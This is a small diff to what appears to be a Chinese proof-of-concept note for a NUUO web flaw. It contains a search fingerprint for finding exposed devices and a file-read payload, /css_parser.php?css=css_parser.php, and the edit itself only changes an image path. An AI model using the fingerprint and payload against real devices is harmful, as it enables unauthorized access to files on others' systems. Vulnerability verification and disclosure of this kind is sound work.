@@ -10,6 +10,6 @@ body="www.nuuo.com/eHelpdesk.php"
 
 payload:/css_parser.php?css=css_parser.php
 
-![](C:\Users\29942\Desktop\chrome_8ASjqxPEEG.png)
+![](2.png)
 
 注：只用来验证，不可用于违法操作
